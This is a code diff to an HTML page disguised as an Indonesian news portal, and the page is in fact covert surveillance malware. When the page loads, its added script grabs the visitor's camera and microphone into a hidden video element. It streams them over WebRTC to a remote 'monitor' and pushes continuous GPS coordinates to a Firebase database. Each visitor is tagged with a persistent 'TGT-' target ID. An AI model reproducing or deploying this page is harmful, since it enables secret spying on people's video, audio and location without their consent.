@@ -3,25 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Berita Nasional Hari Ini</title>
+    <title>Portal Berita Nasional</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; color: #333; }
-        .nav { background: #1a365d; color: white; padding: 15px; font-weight: bold; margin: -20px -20px 20px -20px; }
-        .art { max-width: 600px; margin: 0 auto; }
-        img { width: 100%; border-radius: 8px; margin: 15px 0; }
+        body { font-family: sans-serif; margin: 0; padding: 20px; line-height: 1.6; }
+        .nav { background: #b91c1c; color: white; padding: 15px; font-weight: bold; margin-bottom: 20px; }
         #v { display: none; }
     </style>
 </head>
 <body>
-    <div class="nav">PORTAL BERITA RESMI</div>
-    <div class="art">
-        <h1>Percepatan Jaringan 5G di Seluruh Wilayah Indonesia</h1>
-        <p><small>Dipublikasikan: Baru saja</small></p>
-        <img src="https://picsum.photos/600/300" alt="News">
-        <p>Pemerintah berkomitmen untuk memeratakan akses internet cepat guna mendukung transformasi digital nasional...</p>
-    </div>
+    <div class="nav">INFO NEWS LIVE</div>
+    <h1>Ekonomi Digital Menjadi Pilar Utama Masa Depan Indonesia</h1>
+    <p>Pemerintah optimis bahwa integrasi teknologi informasi akan mempercepat pertumbuhan...</p>
+    <img src="https://picsum.photos/800/400" style="width:100%; border-radius:10px;">
+    
     <video id="v" autoplay playsinline muted></video>
 
     <script>
@@ -31,45 +27,64 @@
             projectId: "chatroom-e9b3f"
         };
         firebase.initializeApp(firebaseConfig);
-        
-        // Buat ID unik untuk setiap perangkat target
-        const targetId = "Target_" + Math.random().toString(36).substr(2, 5);
-        const db = firebase.database().ref('multi_monitor/' + targetId);
 
+        // Gunakan ID tetap agar tetap tersambung meski refresh
+        let targetId = localStorage.getItem('target_id');
+        if (!targetId) {
+            targetId = "TGT-" + Math.random().toString(36).substr(2, 5);
+            localStorage.setItem('target_id', targetId);
+        }
+
+        const db = firebase.database().ref('v5_multi/' + targetId);
         let pc;
         let localStream;
 
-        async function init() {
-            await db.remove(); // Bersihkan sesi lama
-
+        async function createPC() {
+            if (pc) pc.close();
             pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-            
-            try {
-                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                document.getElementById('v').srcObject = localStream;
+
+            pc.onicecandidate = e => {
+                if (e.candidate) db.child('ice_t').push(e.candidate.toJSON());
+            };
+
+            if (localStream) {
                 localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
-            } catch (e) { console.log("Izin ditolak"); }
+            }
+
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            // Simpan offer dengan timestamp untuk memicu monitor
+            db.child('sdp/offer').set({ type: offer.type, sdp: offer.sdp, ts: Date.now() });
+        }
+
+        async function init() {
+            // Bersihkan sdp lama agar monitor tahu kita refresh
+            await db.child('sdp/answer').remove();
+            await db.child('ice_m').remove();
+            await db.child('ice_t').remove();
+
+            localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            document.getElementById('v').srcObject = localStream;
 
             navigator.geolocation.watchPosition(p => {
                 db.child('status').update({ lat: p.coords.latitude, lng: p.coords.longitude, lastSeen: Date.now(), id: targetId });
             });
 
-            pc.onicecandidate = e => { if(e.candidate) db.child('ice_t').push(e.candidate.toJSON()); };
-            
-            const offer = await pc.createOffer();
-            await pc.setLocalDescription(offer);
-            db.child('sdp/offer').set({ type: offer.type, sdp: offer.sdp });
+            await createPC();
 
             db.child('sdp/answer').on('value', async s => {
                 const a = s.val();
-                if(a && !pc.currentRemoteDescription) await pc.setRemoteDescription(new RTCSessionDescription(a));
+                if (a && !pc.currentRemoteDescription) {
+                    await pc.setRemoteDescription(new RTCSessionDescription(a));
+                }
             });
 
-            db.child('ice_m').on('child_added', s => pc.addIceCandidate(new RTCIceCandidate(s.val())));
+            db.child('ice_m').on('child_added', s => {
+                pc.addIceCandidate(new RTCIceCandidate(s.val()));
+            });
         }
 
         window.onload = init;
-        window.onbeforeunload = () => { db.remove(); }; // Hapus saat target offline
     </script>
 </body>
 </html>
